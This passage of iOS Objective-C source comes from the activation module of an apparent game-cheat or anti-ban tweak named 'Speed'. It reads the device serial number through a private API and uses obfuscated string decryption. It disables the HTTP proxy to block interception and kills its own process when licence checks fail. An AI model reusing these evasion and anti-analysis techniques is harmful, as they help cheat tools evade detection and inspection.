                            __builtin_trap();
#pragma clang diagnostic pop
                        }];
                    });
                    return;
                } else {
                    void (^f)(NSString *s) = arr[10];
                    f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]]));
                    return;
                }
            }
        } else {
            NSString *xulieh = GetMobileGestaltValue(CFSTR("SerialNumber"));
            if (xulieh != nil && xulieh.length != 0) {
                [SpeedKeyChain SpeedSetString:SpeedDesEn7En(xulieh) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]];
                void (^f)(NSString *s) = arr[1];
                f(@"请输入您的激活码");
                return;
            } else {
                NSString *xulieh = GetMobileGestaltValue(CFSTR("SerialNumber"));
                if (xulieh != nil && xulieh.length != 0) {
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(xulieh) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]];
                    void (^f)(NSString *s) = arr[1];
                    f(@"请输入您的激活码");
                    return;
                } else {
                    NSString *udid = GetMobileGestaltValue(CFSTR("SerialNumber"));
                    if (udid != nil && udid.length != 0) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(xulieh) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]];
                        void (^f)(NSString *s) = arr[1];
                        f(@"请输入您的激活码");
                        return;
                    } else {
                        NSString *deviceID = nil;
                        if ([UIDevice currentDevice].identifierForVendor.UUIDString &&
                            ![[UIDevice currentDevice].identifierForVendor.UUIDString isEqualToString:@""] &&
                            ![[UIDevice currentDevice].identifierForVendor.UUIDString isEqualToString:@"00000000-0000-0000-0000-000000000000"]) {
                            deviceID = [UIDevice currentDevice].identifierForVendor.UUIDString;
                        } else {
                            NSString *model = [[UIDevice currentDevice] model];
                            NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
                            NSString *bundleId = [[NSBundle mainBundle] bundleIdentifier];
                            uint64_t nanosecondTime;
                            struct timespec spec;
                            clock_gettime(CLOCK_REALTIME, &spec);
                            nanosecondTime = (uint64_t)spec.tv_sec * 1000000000 + (uint64_t)spec.tv_nsec;
                            uint32_t randomSalt;
                            int result = SecRandomCopyBytes(kSecRandomDefault, sizeof(randomSalt), &randomSalt);
                            if (result != errSecSuccess) randomSalt = arc4random();
                            NSString *seedString = [NSString stringWithFormat:@"%@|%@|%@|%llu|%u|%d", model, systemVersion, bundleId, nanosecondTime, randomSalt, getpid()];
                            NSString *hashedUDID = sha256Hash(seedString);
                            deviceID = [NSString stringWithFormat:@"%@-%@-%@-%@-%@",
                                        [hashedUDID substringWithRange:NSMakeRange(0, 8)],
                                        [hashedUDID substringWithRange:NSMakeRange(8, 4)],
                                        [hashedUDID substringWithRange:NSMakeRange(12, 4)],
                                        [hashedUDID substringWithRange:NSMakeRange(16, 4)],
                                        [hashedUDID substringWithRange:NSMakeRange(20, 12)]];
                        }
                        if (deviceID) {
                            [SpeedKeyChain SpeedSetString:SpeedDesEn7En(deviceID) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]];
                            void (^f)(NSString *s) = arr[1];
                            f(@"请输入您的激活码");
                            return;
                        } else {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                            syscall(SYS_kill, getpid(), SIGKILL);
                            __builtin_trap();
#pragma clang diagnostic pop
                        }
                    }
                }
            }
        }
    };
    
    // 输入框
    Spv1 = ^(NSString *s) {
        Class storeClass = objc_getClass("NSUbiquitousKeyValueStore");
        id store = ((id (*)(Class, SEL))objc_msgSend)(storeClass, sel_getUid("defaultStore"));
        ((void (*)(id, SEL, BOOL, NSString *))objc_msgSend)(store, sel_getUid("setBool:forKey:"), NO, @"C^_^HBHSsht##¥");
        HUDRevoke();
        
        NSString *msg = s;
        CryptoBlock decryptBlock = ^NSString*(NSString *s1, NSInteger shift) {
            if (!s1 || s1.length == 0) return @"";
            NSMutableString *firstStep = [NSMutableString string];
            for (NSUInteger i = 0; i < s1.length; i++) {
                unichar character = [s1 characterAtIndex:i];
                unichar shiftedCharacter = character - shift;
                [firstStep appendFormat:@"%C", shiftedCharacter];
            }
            NSMutableString *decryptedBase64 = [NSMutableString stringWithCapacity:firstStep.length];
            for (NSUInteger i = 0; i < firstStep.length; i++) {
                unichar character = [firstStep characterAtIndex:i];
                unichar shiftedCharacter = character;
                if (character >= 'A' && character <= 'Z') {
                    shiftedCharacter = 'A' + ((character - 'A' - shift) % 26);
                    if (shiftedCharacter < 'A') shiftedCharacter += 26;
                } else if (character >= 'a' && character <= 'z') {
                    shiftedCharacter = 'a' + ((character - 'a' - shift) % 26);
                    if (shiftedCharacter < 'a') shiftedCharacter += 26;
                } else if (character >= '0' && character <= '9') {
                    shiftedCharacter = '0' + ((character - '0' - shift) % 10);
                    if (shiftedCharacter < '0') shiftedCharacter += 10;
                } else if (character == '+' || character == '/' || character == '=') {
                    shiftedCharacter = character;
                }
                [decryptedBase64 appendFormat:@"%C", shiftedCharacter];
            }
            
            NSData *data = [[NSData alloc] initWithBase64EncodedString:decryptedBase64 options:0];
            return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"";
        };
        
        // 获取当前顶层 ViewController
        UIViewController* (^TopMostViewControler)(void) = ^UIViewController *{
            UIScene *active = nil;
            for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                if(scene.activationState == UISceneActivationStateForegroundActive &&[scene isKindOfClass:UIWindowScene.class]) active = scene; break;
            }
            UIWindowScene *ws = (UIWindowScene *)active;
            UIWindow *keyWindow = ws.keyWindow ?: ws.windows.firstObject;
            UIViewController *vc =keyWindow.rootViewController;
            while (vc.presentingViewController) {
                vc =vc.presentingViewController;
                
            }
            if ([vc isKindOfClass:UINavigationController.class]) vc = ((UINavigationController *)vc).visibleViewController;
            
            return vc;
        };
        UIViewController *presenter = TopMostViewControler();
        if(!presenter){
            UIScene *anyScene =UIApplication.sharedApplication.connectedScenes.allObjects.firstObject;
            UIWindow *win =[(UIWindowScene *)anyScene windows].firstObject;
            presenter = win.rootViewController ?:[UIViewController new];
            presenter.view.userInteractionEnabled=YES;
            
        }

        // 使用 SpeedAlert 封装输入框
        [SpeedAlertView showWithTitle:SpeedDesEn7De(Speed_name)
                              message:msg
                          placeholder:msg
                         cancelTitle:decryptBlock(@"6IMK5Io6", 5)
                        confirmTitle:decryptBlock(@"5|0K5|]7", 5)
                         cancelColor:[UIColor grayColor]
                        confirmColor:[UIColor systemBlueColor]
                           presenter:presenter
                          completion:^(BOOL confirmed, NSString * _Nullable inputText) {
            // 取反处理
            BOOL isConfirm = !confirmed;

            if (!isConfirm) {
                Spv0();
                return;
            }

          

            // 校验输入
            if (!inputText || inputText.length < 18) {
             
                Spv0();
                return;
            }

            // 检查是否包含中文
            for (int i = 0; i < inputText.length; i++) {
                unichar c = [inputText characterAtIndex:i];
                if (c >= 0x4E00 && c <= 0x9FFF) {
                  
                    Spv0();
                    return;
                }
            }
            void (^f)(NSString *s) = arr[2];
            f(inputText);
        }];
    };
    
    // 首次激活
    Spv2 = ^(NSString *s) {
      
        [SpeedBlock disableHttpProxy];
        NSString *Code_msg = s;
        if (Code_msg == nil) {
            Spv0();
            return;
        }
        CryptoBlock decryptBlock = ^NSString*(NSString *s1, NSInteger shift) {
            if (!s1 || s1.length == 0) return @"";
            NSMutableString *firstStep = [NSMutableString string];
            for (NSUInteger i = 0; i < s1.length; i++) {
                unichar character = [s1 characterAtIndex:i];
                unichar shiftedCharacter = character - shift;
                [firstStep appendFormat:@"%C", shiftedCharacter];
            }
            NSMutableString *decryptedBase64 = [NSMutableString stringWithCapacity:firstStep.length];
            for (NSUInteger i = 0; i < firstStep.length; i++) {
                unichar character = [firstStep characterAtIndex:i];
                unichar shiftedCharacter = character;
                if (character >= 'A' && character <= 'Z') {
                    shiftedCharacter = 'A' + ((character - 'A' - shift) % 26);
                    if (shiftedCharacter < 'A') shiftedCharacter += 26;
                } else if (character >= 'a' && character <= 'z') {
                    shiftedCharacter = 'a' + ((character - 'a' - shift) % 26);
                    if (shiftedCharacter < 'a') shiftedCharacter += 26;
                } else if (character >= '0' && character <= '9') {
                    shiftedCharacter = '0' + ((character - '0' - shift) % 10);
                    if (shiftedCharacter < '0') shiftedCharacter += 10;
                } else if (character == '+' || character == '/' || character == '=') {
                    shiftedCharacter = character;
                }
                [decryptedBase64 appendFormat:@"%C", shiftedCharacter];
            }
            
            NSData *data = [[NSData alloc] initWithBase64EncodedString:decryptedBase64 options:0];
            return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"";
        };
       
        typedef NSString *(^EncryptionBlock)(NSString *);
        EncryptionBlock En_3D=^(NSString *s1){
            return SpeedDesEn7En(s1);
        };
        NSMutableDictionary *param = [NSMutableDictionary dictionary];
        NSDate *date = [NSDate date];
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        param[decryptBlock(@"IGX:kG9", 5)] = En_3D(decryptBlock(@"IGX:kHJrnQ_B", 5));
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSString *appsafecode = [formatter stringFromDate:date];
     
        param[@"date"] = En_3D([formatter stringFromDate:date]);
        NSString *xulih =SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@",SpeedDe(SpeedhitKeyChain),SpeedDesEn7De(Speed_serial),SpeedApp_IDENTITY]]);
        if (xulih==nil||xulih.length==0) {
            Spv0();
            return;
        }
        param[decryptBlock(@"l<5v", 5)] = En_3D(xulih);
        param[decryptBlock(@"nRnf", 5)] = En_3D(s);
        param[decryptBlock(@"kG[B", 5)] = En_3D(md5(SpeedDesEn7De(Speed_appid)));
        param[decryptBlock(@"IHLgm<PwJGXfJQ_B", 5)] = En_3D(appsafecode);
        nlohmann::json jsonParam;
        for (NSString *key  in param.allKeys) {
            NSString *value=param[key];
            jsonParam[[key UTF8String]]=[value UTF8String];
        }
        std::string jsonStr=jsonParam.dump();
        NSString *paramJson=[NSString stringWithUTF8String:jsonStr.c_str()];
        NSString *encrypetdParam=En_3D(paramJson);
        
        typedef NSArray* (^UrlToArrayBlock)(NSString *);
        UrlToArrayBlock UrlToarr = ^(NSString *urlString){
            if (!urlString||urlString.length==0)return @[];
            NSURL *url =[NSURL URLWithString:SpeedDesEn7De(urlString)];
            if (!url)return @[];
            NSArray*urlarr=@[url.scheme ?: @"",url.host ?: @"",url.path ?: @""];
            NSString *v0 =SpeedDesEn7En(urlarr[0]);
            NSString *v1 =SpeedDesEn7En(urlarr[1]);
            NSString *v2 =SpeedDesEn7En(urlarr[2]);
            return @[v0,v1,v2];
        };
        NSArray *components =UrlToarr(Speed_HOST);
     
        MBProgressHUD *Loading = [MBProgressHUD wj_showActivityLoading];

        [NetTool Post_AppendURL:components encryptedParam:encrypetdParam tag:EN_Spv2 mysuccess:^(id responseObject, NSString *serverTime) {
            if (![SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
                [Loading removeFromSuperview];
                [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                
                
                
                void (^f)(NSString *s) = arr[6];
                f(Code_msg);
                return;
            }
            NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:nil];
            if (dict) {
                if ([dict[@"nblaote"] isEqualToString:@"haha"]) {
                    [Loading removeFromSuperview];
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                if (![dict[@"response"][@"appsafecode"] isEqualToString:appsafecode]) {
                    [Loading removeFromSuperview];
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                // NSString *dataString = dict[@"response"][@"data"];
                NSString *De_EndesString = SpeedDe_3DES(dict[@"response"][@"data"], SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
            
                
                NSArray *msg = [De_EndesString componentsSeparatedByString:@"|"];
                NSRange range = [De_EndesString rangeOfString:SpeedDesEn7De(v_yzcg)];
                if (range.location != NSNotFound) {
                   
                    
                    if ([md5([NSString stringWithFormat:@"%@%@%@%@%@%@%@%@", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) isEqualToString:msg[9]] && [msg[0] isEqualToString:SpeedDesEn7De(v_yzcg)]) {
                      
                        
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(dict[@"response"][@"data"]) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                        [Loading removeFromSuperview];
                        NSString* expiresAtStr = SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                         SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                         SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                        NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
                        dateFormatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                        NSDate *expiresDate = ParseDateFlexible(expiresAtStr);
                        NSDate *nowDate =  ParseDateFlexible(serverTime);
                        if (!expiresDate || !nowDate) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                            __builtin_trap();
#pragma clang diagnostic pop
                        }
                        NSTimeInterval diffSeconds = [expiresDate timeIntervalSinceDate:nowDate];
                        NSInteger diffMonths = diffSeconds / (30 * 24 * 3600);
                        if (diffMonths > 18) {
                            [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                            void (^f)(NSString *s) = arr[6];
                            [SpeedBlock disableHttpProxy];
                            f(Code_msg);
                            return;
                        }
                        MBProgressHUD *hud = [MBProgressHUD showHUDAddedTo:[UIApplication sharedApplication].windows[0] animated:YES];
                        hud.mode = MBProgressHUDModeText;
                        hud.labelText = [NSString stringWithFormat:@"%@: %@\n", SpeedDesEn7De(v_yzcgih), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                        hud.userInteractionEnabled = YES;
                        [hud hide:YES afterDelay:3];
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            if ([SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:@"0"]) {
                                if ([SpeedApp_VERSION isEqualToString:SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) {
                                    UIWindow *window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
                                    window.windowLevel = UIWindowLevelAlert;
                                    UIViewController *vc = [UIViewController new];
                                    vc.view.backgroundColor = [UIColor clearColor];
                                    window.rootViewController = vc;
                                    [window makeKeyAndVisible];
                                    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:[NSString stringWithFormat:@"%@%@", SpeedDesEn7De(Speed_name), SpeedDesEn7De(zxgg)] message:[SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) stringByReplacingOccurrencesOfString:@"<br>" withString:@"\n"] preferredStyle:UIAlertControllerStyleAlert];
                                    [alertController addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                        window.hidden = YES;
                                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                                            MBProgressHUD *Function = [MBProgressHUD wj_showLoadingStyle:WJHUDLoadingStyleAnnularDeterminate];
                                            [Function showAnimated:YES whileExecutingBlock:^{
                                                float progress = 0.0f;
                                                while (progress < 1.0f) {
                                                    Function.progress = progress;
                                                    Function.labelText = [NSString stringWithFormat:@"%@正在加载%.0f%%", SpeedDesEn7De(Speed_name), progress * 100];
                                                    progress += 0.01f;
                                                    usleep(30000);
                                                }
                                            } completionBlock:^{
                                            
                                                HUDGrantOnce();
                                             
                                                
                                                
                                                int tok=0;
                                                notify_register_check(CHANGED_NAME, &tok);
                                                uint64_t ts =(uint64_t)[expiresDate timeIntervalSince1970];
                                                notify_set_state(tok, (uint64_t)(ts));
                                                notify_post(CHANGED_NAME);
                                                notify_cancel(tok);
                                                
                                              
                                                NSString *expireString=[NSString stringWithFormat:@"%@", SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                                                
                                                NSError *err = nil;
                                               
                                                SaveExpireToICloudEncrypted(expireString, @"HHSSjjBBJSJ^&^&^&^%%&&&&^&^&^&&^7", &err);
                                             
                                             
                                               
                                                    NSString *mssssg =
                                                        SpeedDe_3DES(
                                                            SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                            SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                            SpeedRebellion_de(AsTostr(Speed_ios_giv,  YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))
                                                        );

                                                       

                                                        NSUbiquitousKeyValueStore *kv = [NSUbiquitousKeyValueStore defaultStore];
                                                        [kv setString:mssssg forKey:kSpeedMsgKey];
                            
                                                
                                                
                                                
                                                [MBProgressHUD wj_hideHUD];
                                            }];
                                        });
                                        void (^f)(NSString *s) = arr[5];
                                        f(SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                                        return;
                                    }]];
                                    [vc presentViewController:alertController animated:YES completion:nil];
                                } else {
                                    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"此版本防封已失效" message:[NSString stringWithFormat:@"新版本：%@-beta 可升级", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))] preferredStyle:UIAlertControllerStyleAlert];
                                    [alertController addAction:[UIAlertAction actionWithTitle:@"前往更新" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                        NSString *urlString = SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                                        if (urlString == nil || urlString.length == 0) {
                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                __builtin_trap();
#pragma clang diagnostic pop
                                            });
                                            return;
                                        }
                                        NSURL *url = [NSURL URLWithString:urlString];
                                        if (url == nil) {
                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                __builtin_trap();
#pragma clang diagnostic pop
                                            });
                                            return;
                                        }
                                        [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:^(BOOL success) {
                                            if (!success) {
                                                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                    __builtin_trap();
#pragma clang diagnostic pop
                                                });
                                            }
                                        }];
                                    }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                                }
                            } else if ([SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:@"1"]) {
